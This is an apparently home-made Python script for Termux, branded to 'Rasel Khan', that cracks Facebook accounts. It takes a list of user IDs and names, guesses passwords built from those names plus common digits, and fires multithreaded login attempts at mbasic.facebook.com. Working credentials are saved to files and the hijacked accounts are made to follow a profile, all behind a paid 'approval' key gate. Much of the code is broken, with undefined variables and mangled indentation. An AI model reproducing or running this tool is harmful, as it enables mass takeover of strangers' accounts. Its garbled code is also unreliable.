import os

try:

    import requests

except ImportError:

    print('\n [✓] installing requests !...\n')

    os.system('pip install requests')

try:

    import concurrent.futures

except ImportError:

    print('\n [✓] installing futures !...\n')

    os.system('pip install futures')

try:

    import bs4

except ImportError:

    print('\n [✓] installing bs4 !...\n')

    os.system('pip install bs4')

import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib

from concurrent.futures import ThreadPoolExecutor as sarfrazssb

from datetime import datetime

from bs4 import BeautifulSoup

ct = datetime.now()

n = ct.month

bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']

try:

    if n < 0 or n > 12:

        exit()

    nTemp = n - 1

except ValueError:

    exit()

current = datetime.now()

ta = current.year

bu = current.month

ha = current.day

op = bulan[nTemp]

P = '\x1b[1;97m' # 

M = '\033[1;96m' # 

H = '\033[1;94m' # 

K = '\x1b[1;93m' # 

B = '\x1b[1;97m' # 

U = '\x1b[1;97m' # 

O = '\x1b[1;97m' # 

N = '\x1b[0m'    # 

my_color = [

 P, M, H, K, B, U, O, N]

warna = random.choice(my_color)

data,data2={},{}

aman,cp,salah=0,0,0

ubahP,fuck,pwBaru=[],[],[]

ok = []

cp = []

id = []

user = []

loop = 0

url_lookup = "https://lookup-id.com/"

url_mb = "https://m.facebook.com"

url_ip = "https://www.httpbin.org/ip"

header_grup = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]"}

bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}

done = False

def jalan(z):

    for e in z + '\n':

        sys.stdout.write(e)

        sys.stdout.flush()

        time.sleep(0.01)
        
        def main_apv():

    imt="Rasel=="

    ak="RASEL-king"

    os.system('clear')

    print(logo)

    try:

        key1=open('/data/data/com.termux/files/usr/bin/.akkkk-cov', 'r').read()

    except IOError:

        os.system("clear")

        print(logo)

        print ("༄rasel᭄•───────────────────────────────────────•༄𝑘ℎ𝑎𝑛᭄")
        print ("YOUR TOKEN IS NOT APROVAL")     
        print ("         THIS IS YOUR TOKEN👇📥📬")
        print ("༄rasel᭄•───────────────────────────────────────•༄𝑘ℎ𝑎𝑛᭄")

        print ("")

        myid=uuid.uuid4().hex[:10].upper()

        print ("          YOUR KEY : "+ak+myid+imt)

        print ("༄rasel᭄•───────────────────────────────────────•༄𝑘ℎ𝑎𝑛᭄")

        kok=open('/data/data/com.termux/files/usr/bin/.akkkk-cov', 'w')

        kok.write(myid+imt)

        kok.close()

        print ("")

        print ("")

        print ("  Copy Key And Sent Me WhatsApp Approvel Your Key ")

        print ("༄rasel᭄•───────────────────────────────────────•༄𝑘ℎ𝑎𝑛᭄")

        time.sleep(3.5)

        tks = 'Dear%20Admin,%20Please%20Approved%20My%20Token%20To%20Premium%20% 20% 20%20%20My%20%20Key%20%20:%20'+ak+''+myid+''+imt

        os.system('am start https://wa.me/01731163689?text=' + tks)

        

    r1=requests.get("https://github.com/NX-CYBAR/Random/blob/main/Approved.txt").text

    if key1 in r1:

        R()

    else:

        os.system("clear")

        print(logo)

        print ("         ༄rasel᭄•───────────────────────────────────────•༄𝑘ℎ𝑎𝑛᭄")
        print ("             \033[1;94mGIVE ME 100RS FOR APROVAL RASEL")     
           
        print ("             \033[1;32mYOUR KEY : "+ak+key1)     
        print ("             Key And Sent Me WP Approvel Your Key ")
        print ("         ༄rasel᭄•───────────────────────────────────────•༄𝑘ℎ𝑎𝑛᭄")

        time.sleep(3.5)

        tks = 'Dear%20Admin,%20Please%20Apporved%20My%20Key%20To%20Premium✓✓%20%20%20%20%20My%20%20Key%20%20:%20'+ak+''+key1

        os.system('am start https://wa.me/01731163689?text=' + tks)

        
logo="""
             \033[1;93m8888888b.                             888
             \033[1;95m888   Y88b                            888
             \033[1;93m888    888                            888
             \033[1;95m888   d88P  8888b.  .d8888b   .d88b.  888
             \033[1;93m8888888P"      "88b 88K      d8P  Y8b 888
             \033[1;95m888 T88b   .d888888 "Y8888b. 88888888 888
             \033[1;93m888  T88b  888  888      X88 Y8b.     888
             \033[1;95m888   T88b "Y888888  88888P'  "Y8888  888
        \033[1;92m༄rasel᭄•───────────────────────────────────────•༄𝑘ℎ𝑎𝑛᭄
             \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
             \033[1;93m▇▇➣    \033[1;95mAUTHOR   : RASEL KHAN             \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;94mGITHUB   : RASEL AHMED            \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;93mFACEBOOK : MR RASEL AHMED \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;92mWHATSAPP : 01315******             \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;91mTHIS  FREE TOOLS                      \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;94mGIVE ME 100RS FOR APRVAL     \033[1;93m▇▇
             \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
         \033[1;92m༄rasel᭄•───────────────────────────────────────•༄𝑘ℎ𝑎𝑛᭄
""" 
def hasil(OK,cp):

	if not len(OK) != 0:	    pass

	if len(cp) != 0:

	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97m/sdcard/RASEL-OK.txt' % (H, P, str(len(ok))))

	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97m/sdcard/RASEL-CP.txt' % (H, P, str(len(cp))))

	    input("\x1b[1;97mPress enter to back Ahmad Menu ")

	    R()

		

def R():

			os.system("clear")

			print(logo)

			print ('༄rasel᭄•───────────────────────────────────────•༄𝑘ℎ𝑎𝑛᭄')

			print("\033[1;93m▇▇➣\033[1;92m❥❥❥❥❥❥❥  \033[1;95mSTART FILE CRACKING  : BST METHOD")

			print("\033[1;93m▇▇➣\033[1;94m❥❥❥❥❥❥❥  \033[1;94mPUBLICK AC CRACKING  : NO LOGIN😓")

			print("\033[1;93m▇▇➣\033[1;95m❥❥❥❥❥❥❥  \033[1;93mUNLIMITED FILEMAKING : NO LOGIN😓")

			print("\033[1;93m▇▇➣\033[1;96m❥❥❥❥❥❥❥  \033[1;92mRANDOM AC CRACKING   : NO LOGIN😓")

			print("\033[1;93m▇▇➣\033[1;97m❥❥❥❥❥❥❥  \033[1;91mFOLLEW ME ON WATAAP  : NO LOGIN😓")

			print ("\033[1;93m▇▇➣\033[1;97m❥❥❥❥❥❥❥\033[1;94mAB DAFA HO JAO YAHASE  : rasel-𝑘ℎ𝑎𝑛")
			print ('\033[1;92m༄rasel᭄•───────────────────────────────────────•༄𝑘ℎ𝑎𝑛᭄')
			key = input(" [*] Choose : ")
			print ('༄rasel᭄•───────────────────────────────────────•༄𝑘ℎ𝑎𝑛᭄')

			if key in [""]:

				print (" [!] Please Select Correct Option")

				exit()

			elif key in ["1", "01"]:

				__xxx__().imtiaz(id)

			elif key in ["2", "02"]:

				

				os.system('python File-Cloning.py')

			elif key in ["3", "03"]:

				

				dupcutter()

			elif key in ["4", "04"]:

				

				os.system("xdg-open https://www.facebook.com/rasel1861?mibextid=ZbWKwL")

				R()

			elif key in ["5", "05"]:

				time.sleep(0.5)

				yt()

				R()

				login()

			elif key in ["0", "00" , "6"]:

				time.sleep(0.5)

				exit("\n [✓] Thank You\n")

class __xxx__:

    def __init__(self):

        self.id = []

    def imtiaz(self,ak):

        if 1 in fuck:

            os.system('#')

        

      

        

        self.cnt = input(' [*] Enter File Name : ')

        self.id = open(self.cnt).read().splitlines()

        os.system('clear')

        print(logo)

        print("")

        ___worldwide___ = ('y')

        if ___worldwide___ in ('yes','Yes','Y', 'y'):

            self.__pler__()

        else:

            print(' [!] Choose Correct One');

            self.sarfrazx(id)

    def __metode__(self, user, __chi__, cebok):

        global ok,cp,loop

        sys.stdout.write(f"\r \x1b[1;33m[RASEL]\x1b[1;33m {loop}|{len(self.id)} \x1b[1;32m[ok][{len(ok)}] ")

        sys.stdout.flush()

        try:

            for pw in __chi__:

                pw = pw.lower()

                session=requests.Session()

                headers = {
    'authority': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=WQdnZSH41apRr7hEYsMZ1bU5; sb=WQdnZUPmBuQnPzgUNwYATqmm',
    'dpr': '2',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"TECNO KI5k"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"12.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'viewport-width': '980',
}


                r = session.get(f"https://{cebok}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header)

                das = {

                    "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),

                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),

                    "uid":user,

                    "flow":"login_no_pin",

                    "pass":pw,

                    "next":"https://developers.facebook.com/tools/debug/accesstoken/"

                }

                headers = {
    'authority': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=WQdnZSH41apRr7hEYsMZ1bU5; sb=WQdnZUPmBuQnPzgUNwYATqmm',
    'dpr': '2',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"TECNO KI5k"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"12.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'viewport-width': '980',
}


                po = session.post(f"https://{facebook}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)

                if 'c_user' in session.cookies.get_dict():

                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

                    print(f"\r{H} [RASEL-ok 🤫] {user} | {pw}")

                    wrt = '%s|%s' % (user,pw)

                    ok.append(wrt)

                    open('/sdcard/RASEL_OK.txt' , 'a').write('%s\n' % wrt)

                    self.follow(session,coki)

                    break

                elif 'checkpoint' in session.cookies.get_dict():

                    try:

                        tokenz = open('.token.txt').read()

                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={token}').json()['birthday']

                        month, day, year = cp_ttl.split('/')

                        month = bulan_ttl[month]

                        

                        wrt = '%s|%s' % (use,w)

                        cp.append(wrt)

                        open('/sdcard/RASEL_CP.txt' , 'a').write('%s\n' % wrt)

                        break

                    except (KeyError, IOError):

                        month = ''

                        day   = ''

                        year  = ''

                    except:

                        pass

                    

                    wrt = '%s|%s' % (usr,w)

                    cp.append(wrt)

                    open('/sdcard/RASEL_CP.txt' , 'a').write('%s\n' % wrt)

                    break

                else:

                    continue

            loop+=1

        except:

            self.__metode__(user, pw, cebok)

    def follow(self, session, coki):

        r = BeautifulSoup(session.get('https://mbasic.facebook.com/AliBaloch356', cookies={'cookie': coki}).text, 'html.parser')

        get = r.find('a', string='Ikuti').get('href')

        session.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text

    def __pler__(self):

        print(' [1] Crack With Auto Pass ')

        print(' [2] Crack With Name Digit Pass')

        chi = input('\n [?] Choose: ')

        if chi == '':

            print('\n   Select Correct One')

            self.__pler__()

        elif chi in ('1', '01'):

            os.system("clear")

            print(logo)

            print("\033[1;32m      Dont Forget Allah😊 \033[1;37m")

            print("༄rasel᭄•───────────────────────────────────────•༄𝑘ℎ𝑎𝑛᭄")

            

            with sarfrazssb(max_workers=70) as ssbworld:

                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia

                    try:

                        uid, name = zsb.split('|')

                        xz = name.split(' ')

                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:

                            pwx = [name, xz[0]+xz[1]]
                            
                            pwx = [name, xz[0] + 'last', xz[0] + 'Frist', xz[0] + 'Last']
                            
                            pwx = [name, xz[0]+xz[1]]

                        else:

                            pwx = [Last, xz[0] + 'Last1', xz[0] + 'first', xz[0] + 'last1']

                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")

                    except:

                        pass

            hasil(ok,cp)

        elif chi in ('2', '02'):

            os.system("clear")

            print(logo)

            print("")

            print("\033[1;37m\r   Enter Last Name Digits\033[1;37m\n")

            print ("\033[1;37m\r   Exmple : 123 + 12345 + 1234 + 1122\033[1;37m\n")

            p1 = input('   Name + 1 : ')

            p2 = input('   Name + 2 : ')

            p3 = input('   Name + 3 : ')

            p4 = input('   Name + 4 : ')

            os.system("clear")

            print(logo)

            print("\033[1;32m      Dont Forget Allah😊 \033[1;37m")

            print("༄rasel᭄•───────────────────────────────────────•༄𝑘ℎ𝑎𝑛᭄")

            with sarfrazssb(max_workers=30) as ssbworld:

                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia

                    try:

                        uid, name = zsb.split('|')

                        xz = name.split(' ')

                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:

                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]

                        else:

                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]

                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")

                    except:

                        pass

            hasil(ok,cp)

        else:

            print('\n Select Valid One')

            self.__pler__()

            

def dupcutter():

	os.system("xdg-open https://wa.me/01731163689")

	time.sleep(3)

	R()

def yt():

	logo()

	os.system("xdg-open https://www.facebook.com/rasel1861?mibextid=ZbWKwL")

	time.sleep(3)

	R()

    

class load:

    def __init__(self):

        _ = ''

        __ = int('30')

        ___ = int('0')

        __ -= 1

        ___ += 1

        for t in range(int("1")):

            print('\r Wait Bro Loading ...')

            sys.stdout.flush()

            time.sleep(0.1)

        print('\n')

main_apv()


